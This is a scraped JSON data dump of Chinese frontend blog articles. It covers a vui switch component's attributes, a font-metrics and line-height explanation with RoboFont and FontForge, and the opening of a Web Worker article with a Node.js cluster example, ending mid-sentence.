class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003ewidth\u003c/td\u003e\n\u003ctd\u003eswitch的宽度（像素）\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e60\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eheight\u003c/td\u003e\n\u003ctd\u003eswitch的高度（像素）\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003edisabled\u003c/td\u003e\n\u003ctd\u003e是否禁用\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003efalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003evalue\u003c/td\u003e\n\u003ctd\u003eswitch初始化选择状态\u003c/td\u003e\n\u003ctd\u003eboolean/number/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eactiveClass\u003c/td\u003e\n\u003ctd\u003eswitch 打开时的class\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003eavtive\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003einactiveClass\u003c/td\u003e\n\u003ctd\u003eswitch 关闭时的class\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003einactive\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003eEvents\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e回调参数\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003echange\u003c/td\u003e\n\u003ctd\u003eswitch 状态发生变化时的回调函数\u003c/td\u003e\n\u003ctd\u003e新状态的值\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e以上组件便是目前vui所有的组件了，后期会不断的进行维护并进行新组件的开发。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003evui\u003c/strong\u003e github传送门：\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui\"\u003ehttps://github.com/Brickies/vui\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003evui\u003c/strong\u003e npm传送门：\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/x-vui\"\u003ehttps://www.npmjs.com/package/x-vui\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003evui\u003c/strong\u003e 文档官网传送门：\u003ca target=\"_blank\" href=\"https://brickies.github.io/vui\"\u003ehttps://brickies.github.io/vui\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e如果小伙伴们喜欢我的\u003cstrong\u003evui\u003c/strong\u003e，欢迎 \u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui\"\u003estar\u003c/a\u003e 。\u003c/p\u003e\n\u003cp\u003e如果有什么问题欢迎小伙伴们随时提 \u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/issues\"\u003eIssue\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e如果有好的组件欢迎小伙伴们随时提\u003ca target=\"_blank\" href=\"https://github.com/Brickies/vui/pulls\"\u003ePR\u003c/a\u003e，我会不定期进行merge\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e后期展望\u003c/h2\u003e\n\u003cp\u003e组件库基本组件完成的差不多，我会做一个该项目搭建以及组件开发的分享，敬请期待~~~\u003c/p\u003e\n","buildTime":"1514893905.0798","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98b"},"id":"593fcecb5c497d006ba82be1","author":{"$oid":"5a4b765a751bf823c002e908"},"imageCache":[{"imageUrlArray":["https://dn-mhke0kuv.qbox.me/5fc5817fc5e871c031d7.png","https://dn-mhke0kuv.qbox.me/d4acda526ca19619d45b.png","https://dn-mhke0kuv.qbox.me/df96656ec5251fa58652.png","https://dn-mhke0kuv.qbox.me/78b8e78303b95ff1bb42.png","https://dn-mhke0kuv.qbox.me/69a95ad64ed3b6a0565a.png","https://dn-mhke0kuv.qbox.me/e2f396b77bf32804e940.png","https://dn-mhke0kuv.qbox.me/af675324474664a18895.png","https://dn-mhke0kuv.qbox.me/83dea5757fd5e2a2369d.png","https://dn-mhke0kuv.qbox.me/d67ceda6ab4849332437.png","https://dn-mhke0kuv.qbox.me/7510729556c89d6df3ae.png","https://dn-mhke0kuv.qbox.me/c506d6db8280e1cf3385.png","https://dn-mhke0kuv.qbox.me/2466c768058f9f100adf.png","https://dn-mhke0kuv.qbox.me/a9d72950897c8282d19b.png","https://dn-mhke0kuv.qbox.me/705ebb820fa075d564e1.png","https://dn-mhke0kuv.qbox.me/852885f0ea862a265b3e.png","https://dn-mhke0kuv.qbox.me/9b3d0e025a574a38326a.png","https://dn-mhke0kuv.qbox.me/753bbe0e2d1949a238ef.png","https://dn-mhke0kuv.qbox.me/63a066aa7a771cb2abcc.png","https://dn-mhke0kuv.qbox.me/7764c29c2e4d3b20bb36.png","https://dn-mhke0kuv.qbox.me/eb1210781c3bfa155e8a.png","https://dn-mhke0kuv.qbox.me/ba034392636ae9f43509.png","https://dn-mhke0kuv.qbox.me/a339cf9006072cb34fd9.png","https://dn-mhke0kuv.qbox.me/1b6f38b78f969e4f2aa0.png"],"screenShot":null}],"title":"字号与行高","meta":{"likeCount":0},"tag":["设计","前端","Windows","Mac"],"comment":[],"shortContent":"1. 什么是字号与行高什么是字号大小？字号大小就是字体的高度，例如设置字号为50px，那么它的高度如下图所示： 什么是行距呢？如下图所示： 其中半行距 = (lineHeight – fontSize) / 2。但是实际上，font-size经常不等于渲染的高度，如下图所示： …","content":"\u003ch2\u003e1. 什么是字号与行高\u003c/h2\u003e\u003cp\u003e什么是字号大小？字号大小就是字体的高度，例如设置字号为50px，那么它的高度如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/5fc5817fc5e871c031d7.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e什么是行距呢？如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/d4acda526ca19619d45b.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e其中半行距 = (lineHeight – fontSize) / 2。\u003c/p\u003e\u003cp\u003e但是实际上，font-size经常不等于渲染的高度，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/df96656ec5251fa58652.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e对于笔者用的ProximaNova这个字体，设置font-size为30px，实际上高度为42px。为什么文字的高度不等于字号的高度？这得从字体设计说起。为此装了一个FontForge和RoboFont软件设计一款自己的字体。\u003c/p\u003e\u003ch2\u003e2. 设计字体\u003c/h2\u003e\u003cp\u003e打开RoboFont，如下图所示：（这个软件经常闪退，需要注意保存）\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/78b8e78303b95ff1bb42.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e双击l和y两个字母，用钢笔工具勾勒形状，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/69a95ad64ed3b6a0565a.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e从上图可以看到它有一些刻度和度量线，画一个示意图如下所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/e2f396b77bf32804e940.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e这些度量线的位置可以自己设置：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/af675324474664a18895.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eUnits Per Em表示一个字的高度有1000个单位，baseline的坐标为0，其它线的坐标相对于baseline，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/83dea5757fd5e2a2369d.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e然后把这个设计好的字体导出为my-font.ttf文件，在网页通过@font-face引入，如下代码所示：\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e@font-face {\n    font-family: \u003cspan class=\"hljs-string\"\u003e'my-font'\u003c/span\u003e;\n    src:url(\u003cspan class=\"hljs-string\"\u003e'/Users/yincheng/Desktop/my-font.ttf'\u003c/span\u003e);\n    font-weight: normal;\n    font-style: normal;\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后使用这个font-family，你会发现，这个字体的font-size和height几乎完全一致，如下图所示，分别设置font-size为35px、45px、55px：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/d67ceda6ab4849332437.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e为什么我们设计的字体会如此“完美”，而其他人的字体高度总是要大一点呢？\u003c/p\u003e\u003ch2\u003e3. 为什么字体高度大于字体大小\u003c/h2\u003e\u003cp\u003e为此我们用FontForge打开ProximaNova.ttf，因为这个软件可以查看字体的更多信息，就是界面丑了点。如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/7510729556c89d6df3ae.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e然后点击Element -\u0026gt; FontInfo，切到OS/2的Metric标签，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/c506d6db8280e1cf3385.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e把鼠标放到相应的输入框，FontForge会提示你Windows系统是使用Win Descent和Ascent决定字体内容高度，而Mac是用的HHead Descent和Ascent。上面字体在Mac下的Ascent为1079，Ascent为-336，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/2466c768058f9f100adf.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e同时它的units of em仍然是1000，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/a9d72950897c8282d19b.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e而它的内容区域content-area大小为1079 - (-336) = 1415是font-size 1000 unit的1415 / 1000 ~= 1.4倍，这就解释了一开始提出的问题：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/705ebb820fa075d564e1.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e设置font-size为30px，实际上显示42px，因为30 * 1.4 = 42px，为进一步验证，把我们设计的字体my-font改一下它的Ascent，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/852885f0ea862a265b3e.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e这样它的内容区域高度就变成了1250unit，是字号大小的1.25倍，导出为一个新的字体，在网页上使用，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/9b3d0e025a574a38326a.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e设置font-size为50px，它的content-area高度为50 * 1.25 = 62.5px。这就证明了上面的分析是对的。\u003c/p\u003e\u003cp\u003e那么为什么设计师们要这样搞呢，为什么不控制在1000个unit的范围内？首先因为常用的unit per em为有以下几个值：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/753bbe0e2d1949a238ef.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e如果你的unit选得越大，那么曲线的光滑粒度可控制得更细，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/63a066aa7a771cb2abcc.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e但是如果选1000的话，因为它是一个整千，比例什么的应该会比较好控制。\u003c/p\u003e\u003cp\u003e其次，大于1000可以让可控制的区域更大，一般不会让字刚好撑到底线和顶线，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/7764c29c2e4d3b20bb36.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e4. 字体的宽度\u003c/h2\u003e\u003cp\u003e可以在RoboFont里面设置每个字的宽度，例如y这个字母我要让它比z占的空间小一点，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/eb1210781c3bfa155e8a.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003ey为400，z为500，也就是说y的宽度为高度的0.4，z的宽度为高度的0.5，因为高度是1000.\u003c/p\u003e\u003cp\u003efont-size为50px的时候，4个yz的宽度为180px，如下图所示：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/ba034392636ae9f43509.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e因为：(50 * 0.4 + 50 * 0.5) * 4 = 180px。\u003c/p\u003e\u003cp\u003e再讨论一个经典的问题。\u003c/p\u003e\u003ch2\u003e5. 图片底部的空白\u003c/h2\u003e\u003cp\u003e有以下html：\u003c/p\u003e\u003cp\u003e\u0026lt;div style=\"border:1px solid #ccc\"\u0026gt;\u0026lt;img src=\"/Users/yincheng/Desktop/2.png\"\u0026gt;\u0026lt;/div\u0026gt;\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e在浏览器下面显示为：\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/a339cf9006072cb34fd9.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e为什么图片不是和div底部贴在一起，而会有一点空白呢？\u003c/p\u003e\u003cp\u003e先来看一下这个空白有多大，如下图所示，设置div的font-size为40px，line-height为60px：\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/1b6f38b78f969e4f2aa0.png\"\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003ediv的高度为174，图片的高度为154，因此这里空白的高度为174 - 154 = 20px。\u003c/p\u003e\u003cp\u003e为了辅助说明，在img的后面跟上几个字母，如下代码所示：\u003c/p\u003e\u003cp\u003e\u0026lt;div class=\"img-container\"\u0026gt;\u0026lt;img src=\"/Users/yincheng/Desktop/2.png\"\u0026gt;lyz\u0026lt;/div\u0026gt;\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e画上辅助线：\n\u003c/code\u003e\u003c/pre\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这段空白的距离就是基线baseline到div底边的距离。由于基线的坐标是0，底线的坐标为-250，所以基线到底线的距离为：\u003c/p\u003e\u003cp\u003e250 / 1000 * 40 = 10px\u003c/p\u003e\u003cp\u003e由于行高为60px，font-size为40px，所以底线到div的距离即半行距为：\u003c/p\u003e\u003cp\u003e（60 - 40）/ 2 = 10px\u003c/p\u003e\u003cp\u003e因此基线到div底边的距离就为：\u003c/p\u003e\u003cp\u003e10px + 10px = 20px\u003c/p\u003e\u003cp\u003e到这里就解释了为什么会有空白，以及空白的大小怎么计算。\u003c/p\u003e\u003cp\u003e那怎么去掉这段空白呢，可以设置div的行高为0。并且需要注意的是在怪异模和有限怪异模式下，为了计算行内子元素的最小高度，一个块级元素的行高必须被忽略，所以即使不设置div的行高为0，图片也是和div贴在一起的。这个我们在《\u003ca href=\"http://fed.renren.com/2017/01/30/chrome-build-dom/\"\u003e从Chrome源码看浏览器如何构建DOM树\u003c/a\u003e》讨论过。\u003c/p\u003e\u003cp\u003e参考：\u003c/p\u003e\u003cp\u003e1. \u003ca href=\"https://www.w3cplus.com/css/css-font-metrics-line-height-and-vertical-align.html\"\u003e深入了解CSS字体度量，行高和vertical-align\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514863300.7922","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c070a"},"id":"5a2f8820f265da43346fe1b4","author":{"$oid":"5a4b770f19da8721f49c06f8"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/12/16049b07b91d7484?w=1314\u0026h=972\u0026f=png\u0026s=134520","https://user-gold-cdn.xitu.io/2017/12/12/16049b050874fd59?w=1318\u0026h=978\u0026f=png\u0026s=140436","https://user-gold-cdn.xitu.io/2017/12/12/16049ae8e5f8f244?w=848\u0026h=1462\u0026f=png\u0026s=518760","https://user-gold-cdn.xitu.io/2017/12/12/16049aed64cc72b7?w=1106\u0026h=480\u0026f=png\u0026s=137068","https://user-gold-cdn.xitu.io/2017/12/12/16049afce1b941f1?w=1330\u0026h=938\u0026f=png\u0026s=138842","https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1"],"screenShot":null}],"title":"咱们worker有力量-在浏览器中玩转多线程和离线应用","meta":{"likeCount":0},"tag":["PWA"],"comment":[],"shortContent":"在 HTML5 规范中提出了工作线程（Web Worker）的概念，允许开发人员编写能够脱离主线程、长时间运行而不被用户所中断的后台程序，去执行事务或者逻辑，并同时保证页面对用户的及时响应。 Web Worker 又分为 Dedicated Worker 和 SharedWor…","content":"\u003cp\u003e提起 “worker” 的话，你能想起什么来呢 --\u003c/p\u003e\n\u003cp\u003e是“咱们工人有力量”？\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba936cdd4f?w=296\u0026amp;h=185\u0026amp;f=jpeg\u0026amp;s=13084\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e还是“伐伐伐...伐木工”?\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba41a29676?w=680\u0026amp;h=480\u0026amp;f=jpeg\u0026amp;s=123327\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e当然，稍有经验的开发者可能已经从标题猜出，今天真正要说的是 -- \u003cstrong\u003eJavaScript 中的 worker 们\u003c/strong\u003e：\u003c/p\u003e\n\u003cp\u003e在 HTML5 规范中提出了工作线程（\u003ccode\u003eWeb Worker\u003c/code\u003e）的概念，允许开发人员编写能够脱离主线程、长时间运行而不被用户所中断的后台程序，去执行事务或者逻辑，并同时保证页面对用户的及时响应。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWeb Worker\u003c/code\u003e 又分为 \u003ccode\u003eDedicated Worker\u003c/code\u003e 和 \u003ccode\u003eSharedWorker\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e随后 \u003ccode\u003eServiceWorker\u003c/code\u003e 也加入进来，用于更好的控制缓存和处理请求，让离线应用成为可能。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eI. 进程和线程\u003c/h2\u003e\n\u003cp\u003e先来复习一下基础知识：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e进程（process）和线程（thread）是操作系统(OS) 里面的两个基本概念\u003c/li\u003e\n\u003cli\u003e对于 OS 来说，一个任务就是一个进程；比如 Chrome 浏览器每打开一个窗口就新建一个进程\u003c/li\u003e\n\u003cli\u003e一个进程可以由多个线程组成，它们分别执行不同的任务；比如 Word 可以借助不同线程同时进行打字、拼写检查、打印等\u003c/li\u003e\n\u003cli\u003e区别在于：每个进程都需要 OS 为其分配独立的内存地址空间，而同一进程中的所有线程共享同一块地址空间\u003c/li\u003e\n\u003cli\u003e多线程可以并发(时间上快速交替)执行，或在多核 CPU 上并行执行\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049abb63a686c3?w=640\u0026amp;h=640\u0026amp;f=jpeg\u0026amp;s=265996\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e传统页面中（HTML5 之前）的 \u003cstrong\u003eJavaScript 的运行都是以单线程的方式工作的\u003c/strong\u003e，虽然有多种方式实现了对多线程的模拟（例如：JavaScript 中的 setinterval 方法，setTimeout 方法等），但是在本质上程序的运行仍然是由 JavaScript 引擎以单线程调度的方式进行的。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba12636e06?w=638\u0026amp;h=359\u0026amp;f=jpeg\u0026amp;s=46303\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为了避免多线程 UI 操作的冲突（如线程1要求浏览器删除DOM节点，线程2却希望修改这个节点的某些样式风格），JS 将处理用户交互、定时执行、操作DOM树/CSS样式树等，都放在了 JS 引擎的一个线程中执行。\u003c/p\u003e\n\u003cp\u003e从 2008 年 W3C 制定出第一个 HTML5 草案开始，HTML5 承载了越来越多崭新的特性和功能。它不但强化了 Web 系统或网页的表现性能，而且还增加了对本地数据库等 Web 应用功能的支持。\u003c/p\u003e\n\u003cp\u003e随之而来的，还有上面提到的几种 \u003ccode\u003eworker\u003c/code\u003e，首先解决的就是多线程的问题。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eII. Master-Worker 模式\u003c/h2\u003e\n\u003cp\u003e那么，来看看解决线程问题的东西为什么叫 \u003ccode\u003eworker\u003c/code\u003e，这来源于一种设计模式：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eMaster-Worker模式是常用的并行设计模式。其核心思想是：系统有两个进程协同工作：Master进程和Worker进程。Master进程负责接收和分配任务，Worker进程负责处理子任务。当各个Worker进程将子任务处理完后，将结果返回给Master进程，由Master进行归纳和汇总，从而得到系统结果\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049aba7ad6f644?w=617\u0026amp;h=343\u0026amp;f=png\u0026amp;s=68915\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image\" src=\"https://user-gold-cdn.xitu.io/2017/12/12/16049abb80646dd2?w=829\u0026amp;h=420\u0026amp;f=png\u0026amp;s=122587\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e实例：Node.js 中的 Master-Worker 模式\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNode 的内置模块 cluster，可以通过一个主进程管理若干子进程的方式来实现集群的功能\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e cluster = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'cluster'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e http = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e numCPUs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'os'\u003c/span\u003e).cpus().length;\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (cluster.isMaster) { \u003cspan class=\"hljs-comment\"\u003e//主进程\u003c/span\u003e\n\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`Master \u003cspan class=\"hljs-subst\"\u003e${process.pid}\u003c/span\u003e is running`\u003c/span\u003e);\n\n  \u003cspan class=\"hljs-comment\"\u003e//分配子任务\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026lt; numCPUs; i++) {\n    cluster.fork();\n  }\n  \n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e { \u003cspan class=\"hljs-comment\"\u003e//子进程\u003c/span\u003e\n\n  \u003cspan class=\"hljs-comment\"\u003e//应用逻辑根本不需要知道自己是在集群还是单边\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e//每个HTTP server都能监听到同一个端口\u003c/span\u003e\n  http.createServer(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n    res.writeHead(\u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e);\n    res.end(\u003cspan class=\"hljs-string\"\u003e'hello world\\n'\u003c/span\u003e);\n  }).listen(\u003cspan class=\"hljs-number\"\u003e8000\u003c/span\u003e);\n\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e`Worker \u003cspan class=\"hljs-subst\"\u003e${process.pid}\u003c/span\u003e started`\u003c/span\u003e);\n  \n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e运行 \u003ccode\u003enode server.js\u003c/code\u003e 后，输出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003eMaster \u003cspan class=\"hljs-number\"\u003e3596\u003c/span\u003e is running\nWorker \u003cspan class=\"hljs-number\"\u003e4324\u003c/span\u003e started\nWorker \u003cspan class=\"hljs-number\"\u003e4520\u003c/span\u003e started\nWorker \u003cspan class=\"hljs-number\"\u003e6056\u003c/span\u003e started\nWorker \u003cspan class=\"hljs-number\"\u003e5644\u003c/span\u003e started\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003eIII. Web Worker\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在 HTML5 中，\u003ccode\u003eWeb Worker\u003c/code\u003e 的出现使得在 Web 页面中进行多线程编程成为可能\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eHTML5 中的多线程是这样一种机制：它允许在 Web 程序中并发执行多个 JavaScript 脚本，每个脚本执行流都称为一个线程，彼此间上下文互相独立，并且由浏览器中的 JavaScript 引擎负责管理\u003c/p\u003e\n\u003cp\u003eHTML5 规范列出了 \u003ccode\u003eWeb Worker\u003c/code\u003e 的三大主要特征：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e能够长时间运行（响应）\u003c/li\u003e\n\u003cli\u003e理想的启动性能\u003c/li\u003e\n\u003cli\u003e理想的内存消耗\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHTML5 中的 \u003ccode\u003eWeb Worker\u003c/code\u003e 